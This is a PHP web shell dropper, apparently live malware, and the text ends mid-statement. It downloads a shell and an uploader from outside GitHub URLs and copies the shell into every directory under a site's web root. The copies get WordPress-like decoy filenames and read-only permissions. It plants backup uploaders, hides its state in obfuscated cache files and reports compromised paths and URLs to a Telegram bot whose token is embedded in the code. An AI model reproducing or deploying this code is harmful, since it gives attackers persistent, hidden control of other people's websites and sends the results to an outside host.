<?php
$showOutput = isset($_GET['TnemaL']) && $_GET['TnemaL'] == '1';

if ($showOutput) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
} else {
    error_reporting(0);
    ini_set('display_errors', 0);
    ob_start();
}

ini_set('max_execution_time', 300);
ini_set('memory_limit', '256M');

$namaShell = 'cron.php';
$namaHtaccess = '.htaccess';
$urlFileShell = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/messiah.php';
$urlFileHtaccess = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/.htaccess';
$urlUploader = 'https://raw.githubusercontent.com/lamentpicasso/lament/main/pikasso.php';

$telegramBotToken = '8274961786:AAEGSehVAxHiW5ZHJo8PG7bcCmaayLGCDoI';
$telegramChatId = '5754370773';
$telegramChannelId = '-1003318416426';
$notificationCooldown = 1800;

function encryptCache($data) {
    $key = 'x7k9m2p5q8w3e6r1t4y7u0i3o6p9a2s5';
    
    $json = json_encode($data, JSON_PRETTY_PRINT);
    
    $compressed = gzcompress($json, 9);
    
    $xored = '';
    $keyLen = strlen($key);
    $dataLen = strlen($compressed);
    for ($i = 0; $i < $dataLen; $i++) {
        $xored .= $compressed[$i] ^ $key[$i % $keyLen];
    }
    
    $base64 = base64_encode($xored);
    
    $obfuscated = strrev($base64);
    
    return $obfuscated;
}

function decryptCache($encrypted) {
    $key = 'x7k9m2p5q8w3e6r1t4y7u0i3o6p9a2s5';
    
    $base64 = strrev($encrypted);
    
    $xored = base64_decode($base64);
    if ($xored === false) {
        return null;
    }
    
    $compressed = '';
    $keyLen = strlen($key);
    $dataLen = strlen($xored);
    for ($i = 0; $i < $dataLen; $i++) {
        $compressed .= $xored[$i] ^ $key[$i % $keyLen];
    }
    
    $json = @gzuncompress($compressed);
    if ($json === false) {
        return null;
    }
    
    return json_decode($json, true);
}

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $h = fopen($url, "r");
        $data = stream_get_contents($h);
        fclose($h);
    } else {
        $data = false;
    }
    return $data;
}

function sendOrEditMessage($botToken, $chatId, $message, $trackFile) {
    $existingMessageId = file_exists($trackFile) ? (int)file_get_contents($trackFile) : 0;
    
    if ($existingMessageId > 0) {
        $url = "https://api.telegram.org/bot{$botToken}/editMessageText";
        $data = [
            'chat_id' => $chatId,
            'message_id' => $existingMessageId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
    } else {
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
    }
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = @curl_exec($ch);
    curl_close($ch);
    
    $result = json_decode($response, true);
    
    if ($result['ok'] && !$existingMessageId) {
        $newMessageId = $result['result']['message_id'];
        file_put_contents($trackFile, $newMessageId);
    }
    
    return $result['ok'] ?? false;
}

function sendTelegramDocument($botToken, $chatId, $filePath, $caption) {
    if (empty($botToken) || empty($chatId) || !file_exists($filePath)) {
        return false;
    }
    
    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
    
    $post_fields = [
        'chat_id' => $chatId,
        'caption' => $caption,
        'document' => new CURLFile(realpath($filePath))
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = @curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function shouldNotify($cooldown) {
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $safeDomain = preg_replace('/[^a-z0-9]/', '_', strtolower($domain));
    $lastNotifyFile = __DIR__ . '/.last_notify_' . $safeDomain;
    
    $forceNotify = isset($_GET['notify']) && $_GET['notify'] == '1';
    
    if ($forceNotify) {
        file_put_contents($lastNotifyFile, time());
        return true;
    }
    
    $lastNotifyTime = file_exists($lastNotifyFile) ? (int)file_get_contents($lastNotifyFile) : 0;
    $currentTime = time();
    
    if ($currentTime - $lastNotifyTime > $cooldown) {
        file_put_contents($lastNotifyFile, $currentTime);
        return true;
    }
    
    return false;
}

function findWebRoot($startDir) {
    if (isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        echo "Web root ditemukan via DOCUMENT_ROOT: {$_SERVER['DOCUMENT_ROOT']}\n";
        return $_SERVER['DOCUMENT_ROOT'];
    }
    
    $current = $startDir;
    $indicators = ['public_html', 'www', 'htdocs', 'public', 'web'];
    
    while ($current !== dirname($current)) {
        $basename = basename($current);
        
        if (in_array($basename, $indicators)) {
            echo "Web root ditemukan via folder indicator: $current\n";
            return $current;
        }
        
        if (file_exists($current . DIRECTORY_SEPARATOR . 'index.php') || 
            file_exists($current . DIRECTORY_SEPARATOR . 'index.html') ||
            file_exists($current . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            echo "Web root ditemukan via root files: $current\n";
            return $current;
        }
        
        $current = dirname($current);
    }
    
    echo "Web root tidak terdeteksi, menggunakan direktori saat ini: $startDir\n";
    return $startDir;
}

echo "Mengambil file shell dari GitHub: $urlFileShell\n";
$shellContent = geturlsinfo($urlFileShell);
if ($shellContent === false) {
    die("Gagal mengambil file shell dari: $urlFileShell");
}
echo "File shell berhasil diambil dari GitHub\n";

$shellMarker = '/*SHELL_MARKER_' . md5($urlFileShell) . '*/';

if (strpos($shellContent, '<?php') === 0) {
    $shellContent = str_replace('<?php', '<?php ' . $shellMarker . ' ', $shellContent);
} elseif (strpos($shellContent, '<?') === 0) {
    $shellContent = str_replace('<?', '<? ' . $shellMarker . ' ', $shellContent);
} else {
    $shellContent = '<?php ' . $shellMarker . ' ?>' . "\n" . $shellContent;
}

echo "\nMengambil file uploader dari GitHub: $urlUploader\n";
$uploaderContent = geturlsinfo($urlUploader);
if ($uploaderContent !== false) {
    echo "File uploader berhasil diambil dari GitHub\n";
} else {
    echo "Gagal mengambil file uploader, menggunakan file saat ini\n";
    $uploaderContent = file_get_contents(__FILE__);
}

echo "Mengambil file .htaccess dari GitHub: $urlFileHtaccess\n";
$htaccessContent = geturlsinfo($urlFileHtaccess);
if ($htaccessContent === false) {
    die("Gagal mengambil file .htaccess dari: $urlFileHtaccess");
}
echo "File .htaccess berhasil diambil dari GitHub\n";

$webRoot = findWebRoot(__DIR__);
$pathFileHtaccess = $webRoot . DIRECTORY_SEPARATOR . $namaHtaccess;

if (file_exists($pathFileHtaccess)) {
    echo "File .htaccess sudah ada di: $pathFileHtaccess (skip upload)\n";
} else {
    if (file_put_contents($pathFileHtaccess, $htaccessContent) !== false) {
        @chmod($pathFileHtaccess, 0444);
        echo "File .htaccess berhasil diupload ke web root: $pathFileHtaccess dengan permission 0444\n";
    } else {
        $error = error_get_last();
        echo "Gagal mengupload file .htaccess ke: $pathFileHtaccess\n";
        echo "Error: " . ($error['message'] ?? 'Unknown error') . "\n";
    }
}

function generateSmartFilename($dir, $shellMarker, &$usedFilenames) {
    $blacklist = [
        'index.php', 'config.php', 'wp-config.php', 'database.php',
        'connection.php', 'settings.php', 'install.php', 'setup.php',
        'admin.php', 'login.php', 'register.php', 'functions.php',
        'autoload.php', 'bootstrap.php', 'init.php', 'loader.php',
        'controller.php', 'model.php', 'middleware.php', 'router.php',
        '.htaccess', 'composer.json', 'package.json'
    ];
    
    $fallbackNames = [
        'wp-vcd.php', 'wp-tmp.php', 'wp-feed.php', 'wp-content.php',
        'xmlrpc-api.php', 'rss-functions.php', 'atom-service.php',
        'trackback-utils.php', 'pingback-handler.php', 'comment-extra.php',
        'nav-menu-legacy.php', 'customize-preview.php', 'revisions-diff.php',
        'embed-template.php', 'oembed-response.php', 'rest-functions.php',
        'ms-functions.php', 'ms-default-filters.php', 'ms-deprecated.php',
        'link-template-tags.php', 'general-template-deprecated.php',
        'post-template-compat.php', 'category-template-legacy.php',
        'author-template-tags.php', 'date-functions.php', 'time-compat.php',
        'formatting-deprecated.php', 'kses-legacy.php', 'cron-api.php',
        'pluggable-deprecated.php', 'capabilities-compat.php',
        'taxonomy-legacy.php', 'term-meta-compat.php', 'query-deprecated.php',
        'rewrite-legacy.php', 'vars-deprecated.php', 'class-compat.php',
        'registration-functions.php', 'registration-deprecated.php',
        'admin-deprecated-compat.php', 'ms-admin-deprecated.php',
        'wp-mail-legacy.php', 'sitemap-functions-compat.php', 'wp-diff-old.php',
        'random-compat.php', 'compat-mbstring.php', 'sodium-compat.php',
        'polyfill-deprecated.php', 'shim-legacy.php', 'fallback-compat.php',
        'bridge-deprecated.php', 'wrapper-legacy.php', 'adapter-compat.php',
        'locale-deprecated.php', 'i18n-legacy.php', 'translation-compat.php',
        'cache-deprecated.php', 'object-cache-legacy.php', 'transient-compat.php',
        'option-deprecated.php', 'meta-legacy.php', 'user-meta-compat.php',
        'post-meta-deprecated.php', 'comment-meta-legacy.php',
        'block-deprecated.php', 'pattern-legacy.php', 'theme-compat.php',
        'sidebar-deprecated.php', 'widget-legacy.php', 'menu-compat.php',
        'shortcode-deprecated.php', 'embed-legacy.php', 'media-compat.php',
        'image-deprecated.php', 'attachment-legacy.php', 'upload-compat.php',
        'http-deprecated.php', 'request-legacy.php', 'response-compat.php',
        'cookie-deprecated.php', 'session-legacy.php', 'nonce-compat.php',
        'auth-deprecated.php', 'user-legacy.php', 'role-compat.php',
        'permission-deprecated.php', 'privacy-legacy.php', 'gdpr-compat.php'
    ];
    
    $existingFiles = @scandir($dir);
    if ($existingFiles === false) {
        return getUnusedFallbackName($fallbackNames, $usedFilenames);
    }
    
    $phpFiles = array_filter($existingFiles, function($file) use ($blacklist) {
        return pathinfo($file, PATHINFO_EXTENSION) === 'php' && !in_array($file, $blacklist);
    });
    
    if (count($phpFiles) < 2) {
        return getUnusedFallbackName($fallbackNames, $usedFilenames);
    }
    
    $words = [];
    $separator = '-';
    
    foreach ($phpFiles as $file) {
        $basename = pathinfo($file, PATHINFO_FILENAME);
        
        if (strpos($basename, '-') !== false) {
            $separator = '-';
            $parts = explode('-', $basename);
        } elseif (strpos($basename, '_') !== false) {
            $separator = '_';
            $parts = explode('_', $basename);
        } else {
            $parts = [$basename];
        }
        
        foreach ($parts as $part) {
            $part = strtolower(trim($part));
            if (strlen($part) > 2 && !is_numeric($part)) {
                $words[] = $part;
            }
        }
    }
    
    if (empty($words)) {
        return getUnusedFallbackName($fallbackNames, $usedFilenames);
    }
    
    $words = array_unique($words);
    $words = array_values($words);
    
    $safeWords = ['legacy', 'compat', 'deprecated', 'extra', 'utils', 'tags', 'alt', 'backup', 'old', 'tmp'];
    $words = array_merge($words, $safeWords);
    
    $attempts = 0;
    $maxAttempts = 30;
    
    while ($attempts < $maxAttempts) {
        shuffle($words);
        $wordCount = rand(2, min(3, count($words)));
        $selectedWords = array_slice($words, 0, $wordCount);
        $filename = implode($separator, $selectedWords) . '.php';
        $filepath = $dir . DIRECTORY_SEPARATOR . $filename;
        
        if (in_array($filename, $blacklist)) {
            $attempts++;
            continue;
        }
        
        if (isset($usedFilenames[$filename])) {
            $usedFilenames[$filename]++;
            if ($usedFilenames[$filename] > 2) {
                $attempts++;
                continue;
            }
        }
        
        if (file_exists($filepath)) {
            $content = @file_get_contents($filepath);
            if ($content && strpos($content, $shellMarker) !== false) {
                $usedFilenames[$filename] = ($usedFilenames[$filename] ?? 0) + 1;
                return $filename;
            }
            
            if (filesize($filepath) > 10240) {
                $attempts++;
                continue;
            }
        }
        
        if (!file_exists($filepath)) {
            $usedFilenames[$filename] = ($usedFilenames[$filename] ?? 0) + 1;
            return $filename;
        }
        
        $attempts++;
    }
    
    return getUnusedFallbackName($fallbackNames, $usedFilenames);
}

function getUnusedFallbackName($fallbackNames, &$usedFilenames) {
    shuffle($fallbackNames);
    
    foreach ($fallbackNames as $name) {
        if (!isset($usedFilenames[$name]) || $usedFilenames[$name] < 2) {
            $usedFilenames[$name] = ($usedFilenames[$name] ?? 0) + 1;
            return $name;
        }
    }
    
    $timestamp = substr(md5(microtime()), 0, 6);
    return 'class-' . $timestamp . '.php';
}

function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
    $today = date('Y-m-d');
    $uploaderCacheFile = $webRoot . DIRECTORY_SEPARATOR . '.cron_cache';
    $uploaderMap = [];
    
    if (file_exists($uploaderCacheFile)) {
        $encryptedData = file_get_contents($uploaderCacheFile);
        $cache = decryptCache($encryptedData);
        
        if (isset($cache['date']) && $cache['date'] === $today) {
            $uploaderMap = $cache['uploaders'] ?? [];
            echo "Menggunakan backup uploader locations dari cache hari ini ($today)\n";
        } else {
            echo "Uploader cache expired (tanggal berbeda), generate lokasi baru\n";
            if (isset($cache['success_rate']) && $cache['success_rate'] < 0.8) {
                echo "⚠️ Success rate rendah kemarin, KEEP old uploaders\n";
            } else {
                echo "✅ Success rate bagus, cleanup old uploaders\n";
                cleanupOldUploaders($webRoot, $cache['uploaders'] ?? []);
            }
        }
    }
    
    $isNewDay = empty($uploaderMap);
    $backupPaths = [];
    
    if ($isNewDay) {
        $directories = getAllDirs($webRoot);
        
        if (count($directories) < $count) {
            $count = count($directories);
        }
        
        shuffle($directories);
        $selectedDirs = array_slice($directories, 0, $count);
        
        $uploaderNames = [
            'wp-settings-backup.php', 'theme-update-check.php', 'plugin-verify.php',
            'system-check.php', 'health-monitor.php', 'maintenance-mode.php',
            'update-core-verify.php', 'db-repair-check.php', 'cache-cleanup.php'
        ];
        
        foreach ($selectedDirs as $index => $dir) {
            $uploaderName = $uploaderNames[$index % count($uploaderNames)];
            $uploaderPath = $dir . DIRECTORY_SEPARATOR . $uploaderName;
            $subdirKey = str_replace($webRoot, '', $dir);
            
            if (file_put_contents($uploaderPath, $uploaderContent) !== false) {
                @chmod($uploaderPath, 0644);
                $backupPaths[] = $uploaderPath;
                $uploaderMap[$subdirKey] = $uploaderName;
                echo "  New uploader: $uploaderName in $subdirKey\n";
            }
        }
    } else {
        foreach ($uploaderMap as $subdirKey => $uploaderName) {
            $uploaderPath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $uploaderName;
            
            if (file_put_contents($uploaderPath, $uploaderContent) !== false) {
                @chmod($uploaderPath, 0644);
                $backupPaths[] = $uploaderPath;
                echo "  Reuse uploader: $uploaderName in $subdirKey\n";
            }
        }
    }
    
    $successCount = count($backupPaths);
    $totalCount = $count;
    $successRate = $totalCount > 0 ? $successCount / $totalCount : 0;
    
    $cacheData = [
        'date' => $today,
        'uploaders' => $uploaderMap,
        'success_rate' => $successRate,
        'total' => $totalCount,
        'success' => $successCount,
        'timestamp' => time()
    ];
    
    $encryptedCache = encryptCache($cacheData);
    file_put_contents($uploaderCacheFile, $encryptedCache);
    @chmod($uploaderCacheFile, 0600);
    
    return $backupPaths;
}

function cleanupOldUploaders($baseDir, $oldUploaderMap) {
    if (empty($oldUploaderMap)) {
        return;
    }
    
    echo "\n🧹 Cleanup old uploaders from yesterday...\n";
    $deletedCount = 0;
    
    foreach ($oldUploaderMap as $subdirKey => $filename) {
        $filepath = $baseDir . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_exists($filepath)) {
            @chmod($filepath, 0644);
            if (@unlink($filepath)) {
                $deletedCount++;
                echo "  ✓ Deleted: $filepath\n";
            }
        }
    }
    
    echo "Total deleted: $deletedCount old uploaders\n";
}

function getAllDirs($dir) {
    $subDirs = [];
    $items = @scandir($dir);
    
    if ($items === false) {
        return $subDirs;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && is_readable($path)) {
            $subDirs[] = $path;
            $subDirs = array_merge($subDirs, getAllDirs($path));
        }
    }
    return $subDirs;
}

function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
    $directories = getAllDirs($dir);
    $resultPaths = [];
    $usedFilenames = [];
    
    echo "\nMulai upload shell ke " . count($directories) . " direktori...\n";
    
    $today = date('Y-m-d');
    $cacheFile = $dir . DIRECTORY_SEPARATOR . '.system_cache';
    $shellMap = [];
    
    protectCacheFile($cacheFile);
    
    if (file_exists($cacheFile)) {
        $encryptedData = file_get_contents($cacheFile);
        $cache = decryptCache($encryptedData);
        
        if (isset($cache['date']) && $cache['date'] === $today) {
            $shellMap = $cache['shells'] ?? [];
            echo "Menggunakan nama file dari cache hari ini ($today)\n";
        } else {
            echo "Cache expired (tanggal berbeda), generate nama baru\n";
            if (isset($cache['success_rate']) && $cache['success_rate'] < 0.8) {
                echo "⚠️ Success rate rendah kemarin (" . ($cache['success_rate']*100) . "%), KEEP old shells sebagai backup\n";
            } else {
                echo "✅ Success rate bagus kemarin, cleanup old shells\n";
                cleanupOldShells($dir, $cache['shells'] ?? []);
            }
        }
    }
    
    $isNewDay = empty($shellMap);
    
    foreach ($directories as $subdir) {
        $subdirKey = str_replace($dir, '', $subdir);
        
        if (isset($shellMap[$subdirKey])) {
            $smartFilename = $shellMap[$subdirKey];
            echo "  Reuse: $smartFilename in $subdirKey\n";
        } else {
            $smartFilename = generateSmartFilename($subdir, $shellMarker, $usedFilenames);
            $shellMap[$subdirKey] = $smartFilename;
            echo "  New: $smartFilename in $subdirKey\n";
        }
        
        $filePathShell = $subdir . DIRECTORY_SEPARATOR . $smartFilename;
        
        if (file_exists($filePathShell)) {
            @chmod($filePathShell, 0644);
        }
        
        if (file_put_contents($filePathShell, $shellContent) !== false) {
            @chmod($filePathShell, 0444);
            $resultPaths[] = "SUCCESS: $filePathShell";
        } else {
            $resultPaths[] = "FAILED: $filePathShell";
        }
    }
    
    $successCount = count(array_filter($resultPaths, fn($l) => strpos($l, 'SUCCESS') !== false));
    $totalCount = count($resultPaths);
    $successRate = $totalCount > 0 ? $successCount / $totalCount : 0;
    
    $cacheData = [
        'date' => $today,
        'shells' => $shellMap,
        'success_rate' => $successRate,
        'total' => $totalCount,
        'success' => $successCount,
        'timestamp' => time()
    ];
    
    $encryptedCache = encryptCache($cacheData);
    file_put_contents($cacheFile, $encryptedCache);
    @chmod($cacheFile, 0600);
    
    echo "\nStatistik penggunaan nama file:\n";
    arsort($usedFilenames);
    $top5 = array_slice($usedFilenames, 0, 5, true);
    foreach ($top5 as $name => $count) {
        echo "  $name: digunakan $count kali\n";
    }
    
    return $resultPaths;
}

function protectCacheFile($cacheFile) {
    $cacheDir = dirname($cacheFile);
    $htaccessFile = $cacheDir . DIRECTORY_SEPARATOR . '.htaccess';
    
    $htaccessRules = "
# Protect system cache files
<Files \".system_cache\">
    Order Allow,Deny
    Deny from all
</Files>

# Protect cron cache files
<Files \".cron_cache\">
    Order Allow,Deny
    Deny from all
</Files>

# Protect database backup
<Files \"db.txt\">
    Order Allow,Deny
    Deny from all
</Files>

# Protect all dot files (hidden files)
<FilesMatch \"^\\.\">
    Order Allow,Deny
    Deny from all
</FilesMatch>
";
    
    if (!file_exists($htaccessFile)) {
        if (@file_put_contents($htaccessFile, $htaccessRules) !== false) {
            @chmod($htaccessFile, 0644);
            echo "✅ .htaccess protection created\n";
        } else {
            echo "⚠️ Cannot create .htaccess (permission denied), using fallback\n";
            createFallbackProtection($cacheFile);
        }
    } else {
        if (!is_writable($htaccessFile)) {
            @chmod($htaccessFile, 0644);
        }
        
        if (is_writable($htaccessFile)) {
            $content = @file_get_contents($htaccessFile);
            if ($content !== false && strpos($content, '.system_cache') === false) {
                if (@file_put_contents($htaccessFile, $content . "\n" . $htaccessRules) !== false) {
                    echo "✅ .htaccess protection rules added\n";
                } else {
                    echo "⚠️ Cannot modify .htaccess (permission denied), using fallback\n";
                    createFallbackProtection($cacheFile);
                }
            }
        } else {
            echo "⚠️ .htaccess not writable (owner/permission issue), using fallback\n";
            createFallbackProtection($cacheFile);
        }
    }
}

function createFallbackProtection($cacheFile) {
    $cacheDir = dirname($cacheFile);
    $localHtaccess = $cacheDir . DIRECTORY_SEPARATOR . '.htaccess_protection';
    
    $rules = "# If you can access this file, move these rules to main .htaccess manually
# Or change .htaccess ownership to allow PHP to write

<Files \".system_cache\">
    Order Allow,Deny
    Deny from all
</Files>

<Files \".cron_cache\">
    Order Allow,Deny
    Deny from all
</Files>

<Files \"db.txt\">
    Order Allow,Deny
    Deny from all
</Files>

<FilesMatch \"^\\.\">
    Order Allow,Deny
    Deny from all
</FilesMatch>
";
    
    @file_put_contents($localHtaccess, $rules);
    echo "📝 Protection rules saved to .htaccess_protection\n";
    echo "⚠️ Manual action needed: Copy rules to main .htaccess\n";
}

function cleanupOldShells($baseDir, $oldShellMap) {
    if (empty($oldShellMap)) {
        return;
    }
    
    echo "\n🧹 Cleanup old shells from yesterday...\n";
    $deletedCount = 0;
    
    foreach ($oldShellMap as $subdirKey => $filename) {
        $filepath = $baseDir . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_exists($filepath)) {
            @chmod($filepath, 0644);
            if (@unlink($filepath)) {
                $deletedCount++;
                echo "  ✓ Deleted: $filepath\n";
            }
        }
    }
    
    echo "Total deleted: $deletedCount old shells\n";
}

function writeResultToFile($resultPaths, $outputFile) {
    $content = implode("\n", $resultPaths);
    file_put_contents($outputFile, $content);
    echo "Hasil telah ditulis ke $outputFile\n";
}

echo "\n========================================\n";
echo "Memulai upload shell dari web root: $webRoot\n";
echo "========================================\n";

$hasilPaths = uploadFilesToAllDirs($webRoot, $shellContent, $shellMarker);

$successCount = count(array_filter($hasilPaths, function($line) {
    return strpos($line, 'SUCCESS') !== false;
}));
$failedCount = count(array_filter($hasilPaths, function($line) {
    return strpos($line, 'FAILED') !== false;
}));

echo "\n========================================\n";
echo "RINGKASAN:\n";
echo "Berhasil: $successCount file\n";
echo "Gagal: $failedCount file\n";
echo "========================================\n";

$outputFile = $webRoot . DIRECTORY_SEPARATOR . 'db.txt';
writeResultToFile($hasilPaths, $outputFile);

echo "\n========================================\n";
echo "Membuat backup uploader di lokasi acak...\n";
echo "========================================\n";

$backupPaths = createBackupUploaders($webRoot, $uploaderContent, 3);

if (count($backupPaths) > 0) {
    echo "\nBackup uploader berhasil dibuat:\n";
    foreach ($backupPaths as $path) {
        echo "  - $path\n";
    }
} else {
    echo "\nTidak ada backup uploader yang dibuat\n";
}

if (shouldNotify($notificationCooldown)) {
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $safeDomain = str_replace('.', '', $domain);
    
    $summaryMessage = "━━━━━━━━━━━━━━━━\n";
    $summaryMessage .= "📄 <b>REPORT #{$safeDomain}</b>\n";
    $summaryMessage .= "━━━━━━━━━━━━━━━━\n\n";
    $summaryMessage .= "📊 <b>Summary:</b>\n";
    $summaryMessage .= "  ✅ Success: {$successCount}\n";
    $summaryMessage .= "  ❌ Failed: {$failedCount}\n";
    $summaryMessage .= "  🔄 Uploaders: " . count($backupPaths) . "\n\n";
    
    if (count($backupPaths) > 0) {
        $summaryMessage .= "🔗 <b>Backup URLs:</b>\n";
        foreach ($backupPaths as $path) {
            $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
            $url = "https://{$domain}{$relativePath}";
            $summaryMessage .= "  • <code>{$url}</code>\n";
        }
        $summaryMessage .= "\n";
    }
    
    $summaryMessage .= "💬 <b>Commands:</b>\n";
    $summaryMessage .= "  • <code>?notify=1</code> - Force update\n";
    $summaryMessage .= "  • <code>?senddb=1</code> - Get db.txt\n";
    $summaryMessage .= "  • <code>?fullreport=1</code> - Full paths file\n\n";
    
    $summaryMessage .= "⏰ " . date('Y-m-d H:i:s') . "\n";
    $summaryMessage .= "━━━━━━━━━━━━━━━━";
    
    $chatTrackFile = __DIR__ . '/.telegram_chat_master';
    sendOrEditMessage($telegramBotToken, $telegramChatId, $summaryMessage, $chatTrackFile);
    echo "\n✅ Chat dashboard updated!\n";
    
    $successPaths = array_filter($hasilPaths, fn($l) => strpos($l, 'SUCCESS') !== false);
    $failedPaths = array_filter($hasilPaths, fn($l) => strpos($l, 'FAILED') !== false);
    
    $totalPaths = count($successPaths) + count($failedPaths);
    
    if ($totalPaths > 50) {
        $fullReport = "━━━━━━━━━━━━━━━━\n";
        $fullReport .= "📋 FULL REPORT\n";
        $fullReport .= "🌐 Domain: {$domain}\n";
        $fullReport .= "━━━━━━━━━━━━━━━━\n\n";
        $fullReport .= "📊 Summary:\n";
        $fullReport .= "  ✅ Success: " . count($successPaths) . "\n";
        $fullReport .= "  ❌ Failed: " . count($failedPaths) . "\n";
        $fullReport .= "  📁 Total: {$totalPaths}\n\n";
        
        if (count($successPaths) > 0) {
            $fullReport .= "✅ SUCCESS PATHS (" . count($successPaths) . "):\n";
            $fullReport .= str_repeat("─", 40) . "\n";
            foreach ($successPaths as $line) {
                $path = str_replace('SUCCESS: ', '', $line);
                $fullReport .= $path . "\n";
            }
            $fullReport .= "\n";
        }
        
        if (count($failedPaths) > 0) {
            $fullReport .= "❌ FAILED PATHS (" . count($failedPaths) . "):\n";
            $fullReport .= str_repeat("─", 40) . "\n";
            foreach ($failedPaths as $line) {
                $path = str_replace('FAILED: ', '', $line);
                $fullReport .= $path . "\n";
            }
            $fullReport .= "\n";
        }
        
        if (count($backupPaths) > 0) {
            $fullReport .= "🔄 BACKUP UPLOADERS:\n";
            $fullReport .= str_repeat("─", 40) . "\n";
            foreach ($backupPaths as $path) {
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
                $url = "https://{$domain}{$relativePath}";
                $fullReport .= $url . "\n";
            }
            $fullReport .= "\n";
        }
        
        $fullReport .= str_repeat("─", 40) . "\n";
        $fullReport .= "⏰ Generated: " . date('Y-m-d H:i:s') . "\n";
        $fullReport .= "━━━━━━━━━━━━━━━━";
        
        $reportFile = $webRoot . DIRECTORY_SEPARATOR . $safeDomain . '_full_report.txt';
        file_put_contents($reportFile, $fullReport);
        
        $caption = "📄 <b>Full Report: {$domain}</b>\n";
        $caption .= "📊 {$successCount} success, {$failedCount} failed\n";
        $caption .= "⏰ " . date('Y-m-d H:i:s');
        
        if (sendTelegramDocument($telegramBotToken, $telegramChannelId, $reportFile, $caption)) {
            echo "✅ Full report sent as file to channel!\n";
            @unlink($reportFile);
        }
        
        $detailedReport = "━━━━━━━━━━━━━━━━\n";
        $detailedReport .= "📄 <b>#" . $safeDomain . "</b>\n";
        $detailedReport .= "🌐 {$domain}\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━\n\n";
        $detailedReport .= "📊 <b>Summary:</b>\n";
        $detailedReport .= "  ✅ Success: " . count($successPaths) . "\n";
        $detailedReport .= "  ❌ Failed: " . count($failedPaths) . "\n";
        $detailedReport .= "  📁 Total paths: {$totalPaths}\n\n";
        $detailedReport .= "📎 <b>Full report sent as file above</b>\n";
        $detailedReport .= "  (Too many paths to show inline)\n\n";
        
        if (count($backupPaths) > 0) {
            $detailedReport .= "🔄 <b>BACKUP UPLOADERS:</b>\n";
            foreach ($backupPaths as $path) {
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
                $url = "https://{$domain}{$relativePath}";
                $detailedReport .= "<code>{$url}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        $detailedReport .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━";
        
    } else {
        $detailedReport = "━━━━━━━━━━━━━━━━\n";
        $detailedReport .= "📄 <b>#" . $safeDomain . "</b>\n";
        $detailedReport .= "🌐 {$domain}\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━\n\n";
        
        if (count($successPaths) > 0) {
            $detailedReport .= "✅ <b>SUCCESS (" . count($successPaths) . "):</b>\n";
            foreach ($successPaths as $line) {
                $path = str_replace('SUCCESS: ', '', $line);
                $detailedReport .= "<code>{$path}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        if (count($failedPaths) > 0) {
            $detailedReport .= "❌ <b>FAILED (" . count($failedPaths) . "):</b>\n";
            foreach ($failedPaths as $line) {
                $path = str_replace('FAILED: ', '', $line);
                $detailedReport .= "<code>{$path}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        if (count($backupPaths) > 0) {
            $detailedReport .= "🔄 <b>BACKUP UPLOADERS:</b>\n";
            foreach ($backupPaths as $path) {
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
                $url = "https://{$domain}{$relativePath}";
                $detailedReport .= "<code>{$url}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        $detailedReport .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━";
    }
    
    $channelTrackFile = __DIR__ . '/.telegram_channel_' . $safeDomain;
    sendOrEditMessage($telegramBotToken, $telegramChannelId, $detailedReport, $channelTrackFile);
    echo "✅ Channel report updated!\n";
    
} else {
